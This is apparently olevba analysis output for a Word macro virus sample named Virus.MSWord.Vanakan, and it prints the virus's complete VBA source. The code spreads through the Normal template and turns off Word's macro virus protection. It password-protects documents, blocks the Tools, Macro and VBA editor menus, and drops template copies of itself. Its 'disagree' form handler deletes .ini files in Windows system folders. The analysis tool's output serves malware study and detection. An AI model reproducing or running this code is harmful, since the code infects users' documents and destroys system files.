olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Vanakan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Vanakan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MalaysianIndian.bas 
in file: ./Virus.MSWord.Vanakan - OLE stream: 'Macros/VBA/MalaysianIndian'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public sfile, dfile, MacroActive As Variant
Public infected, KillMacro, ReturnValue, foundDot, foundDoc As Boolean
Public myVirus(2) As String
Dim errormsg
Function MacroTrue()
    WordBasic.disableautomacros True
End Function
Function MacroFalse()
    WordBasic.disableautomacros False
End Function
Function AssignCode()
    myVirus(0) = "MalaysianIndian"
    myVirus(1) = "Indian"
    myVirus(2) = "IndianMsg"
End Function

Sub TransferMacro(SourceFile, DestinationFile)
    Dim TempMacro
    For Each TempMacro In myVirus
       Application.OrganizerCopy SourceFile.FullName, DestinationFile.FullName, TempMacro, 3
    Next TempMacro
End Sub

Function GetFile()
    MacroActive = MacroContainer
    Set dfile = ActiveDocument
    Set sfile = NormalTemplate
    
    If MacroActive = dfile Then
        Set sfile = dfile
        Set dfile = NormalTemplate
    Else
        Set sfile = NormalTemplate
        Set dfile = ActiveDocument
    End If
End Function

Function InsertFootNote()
    If ActiveDocument.ProtectionType = wdNoProtection Then
      With ActiveDocument.Sections(1)
        .Headers(wdHeaderFooterPrimary).Range.Text = "Indian 2000"
        .Footers(wdHeaderFooterPrimary).Range.Text = "Indian The Best"
      End With
    End If
End Function

Function CheckInfection(NeedFile) As Boolean
    Dim mv
    Dim Md
    
    For Each Md In NeedFile.VBProject.VBComponents
    If Md.Name <> "ThisDocument" And Md.Name <> "MalaysianIndian" And Md.Name <> "Indian" And Md.Name <> "IndianMsg" Then
       Application.OrganizerDelete NeedFile.FullName, Md.Name, 3
    End If
    Next Md
    
   For Each mv In NeedFile.VBProject.VBComponents
     If mv.Name = "MalaysianIndian" Then
       CheckInfection = True
       Exit Function
     End If
     If mv.Name <> "MalaysianIndian" Then
       CheckInfection = False
     End If
    Next mv
End Function
Function UnprotectDocument()
    If ActiveDocument.ProtectionType <> wdNoProtection Then
        ActiveDocument.Unprotect Password:="pascalline"
    End If
End Function
Function ProtectDocument()
    If ActiveDocument.ProtectionType = wdNoProtection Then
        WordBasic.ToolsProtectDocument DocumentPassword:="pascalline", NoReset:=1, Type:=1
    End If
End Function
Function InfectDeinfect(SourceDoc, DestinationDoc)
   AssignCode
   ReturnValue = CheckInfection(DestinationDoc)
   If ReturnValue <> True Then
      TransferMacro SourceDoc, DestinationDoc
   End If
End Function

Sub AutoNew()
On Error GoTo StopAutoNew
    InsertFootNote
StopAutoNew:
End Sub

Sub AutoClose()
On Error GoTo StopAutoClose
    Dim aClose
    Application.DisplayAlerts = -1
    Options.VirusProtection = False
    GetFile
    aClose = InfectDeinfect(sfile, dfile)
    If ActiveDocument.ReadOnly = False Then
        ProtectDocument
        WordBasic.FileSaveAs Format:=1
    End If
StopAutoClose:
End Sub
Sub AutoOpen()
On Error GoTo StopAutoOpen
    Dim aOpen
    GetFile
    aOpen = CheckInfection(sfile)
    If ActiveDocument.ProtectionType = wdNoProtection Then
        InsertFootNote
    End If
StopAutoOpen:
End Sub

Sub AutoExit()
On Error GoTo StopAutoExit
    Dim SearchObj As Object
    foundDot = False
    For Each SearchObj In AddIns
        If SearchObj.Name = "IndianTheBest.dot" Then foundDot = True
    Next SearchObj
    
    If foundDot <> True Then
        Application.Visible = False
        Documents.Add
        GetFile
        aClose = InfectDeinfect(sfile, dfile)
        With ActiveDocument
                .SaveAs FileName:=Options.DefaultFilePath(8) & "\IndianTheBest.src", fileformat:=wdFormatDocument, AddtoRecentFiles:=False
                .SaveAs FileName:=Options.DefaultFilePath(8) & "\IndianTheBest.dot", fileformat:=wdFormatTemplate, AddtoRecentFiles:=False
                .SaveAs FileName:=Options.DefaultFilePath(9) & "\Document1.doc", fileformat:=wdFormatTemplate, AddtoRecentFiles:=False
        End With
    End If
StopAutoExit:
Application.Quit
End Sub

Sub AutoExec()
On Error GoTo StopAutoExec

MacroTrue
AddIns.Unload False
MacroFalse

Dim SourceFile, DestinationFile As Variant
Dim mv
Dim searchF
Dim aAutoExec
   
    foundDot = False
    foundDoc = False
    infected = False
    
    With Application.FileSearch
        .FileName = "IndianTheBest.dot"
        .LookIn = Options.DefaultFilePath(8)
        .Execute
        For i = 1 To .FoundFiles.Count
         If UCase(.FoundFiles(i)) = UCase(Options.DefaultFilePath(8) & "\IndianTheBest.dot") Then foundDot = True
        Next i
    End With
   
    With Application.FileSearch
        .FileName = "Document1.doc"
        .LookIn = Options.DefaultFilePath(9)
        .Execute
        For i = 1 To .FoundFiles.Count
         If UCase(.FoundFiles(i)) = UCase(Options.DefaultFilePath(9) & "\Document1.doc") Then foundDoc = True
        Next i
    End With
   
    If foundDoc = False And foundDot = True Then
      FileCopy Options.DefaultFilePath(8) & "\IndianTheBest.src", Options.DefaultFilePath(9) & "\Document1.doc"
    End If
    
    If foundDot = True Then
       Set sfile = NormalTemplate
       For Each mv In sfile.VBProject.VBComponents
        If mv.Name = "MalaysianIndian" Then
           infected = True
        End If
       Next mv
       
       If infected = False Then
        Documents.Open FileName:=Options.DefaultFilePath(9) & "\Document1.doc", ReadOnly:=True
       End If
       
    End If
      
    If Day(Now) = 23 Then
        IndianMsg.Show
    End If
StopAutoExec:
End Sub


-------------------------------------------------------------------------------
VBA MACRO Indian.bas 
in file: ./Virus.MSWord.Vanakan - OLE stream: 'Macros/VBA/Indian'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public msg
Sub EditCopy()
'Disable copying function
End Sub

Sub EditPaste()
'Disable Paste Function
End Sub

Sub ToolsCustomize()
    msg = MsgBox("Indian Virus Disable me, Sorry!!.", vbCritical, "Warning")
End Sub

Sub ToolsMacro()
   msg = MsgBox("You are not allowed to modify me.", vbCritical, "Warning")
End Sub
Sub ViewVBCode()
    msg = MsgBox("You are not allowed to modify me.", vbCritical, "Warning")
End Sub

Sub InsertFile()
     msg = MsgBox("Sorry!!   I am too smart for you.", vbCritical, "Warning")
End Sub

-------------------------------------------------------------------------------
VBA MACRO IndianMsg.frm 
in file: ./Virus.MSWord.Vanakan - OLE stream: 'Macros/VBA/IndianMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



































Private Sub disagree_Click()
Dim dirname(5) As String
Dim i As Integer
Dim return_your_answer

On Error GoTo StopDelete
    IndianMsg.Hide
    return_your_answer = MsgBox("Vanakam _/\_ You been erased!!", vbCritical, "Messager")
    dirname(1) = "c:\windows\*.ini"
    dirname(2) = "c:\winnt\*.ini"
    dirname(3) = "d:\windows\*.ini"
    dirname(4) = "d:\winnt\*.ini"
  
    For i = 1 To 4
        Kill dirname(i)
    Next i
StopDelete:
Application.Quit
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I AGREE
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bookman Old Style
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I DISAGREE.i�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bookman Old Style
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Indian The Best
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'agree'" IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'disagree'" IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'IndianLabel'" IN './Virus.MSWord.Vanakan' - OLE stream: 'Macros/IndianMsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |disagree_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

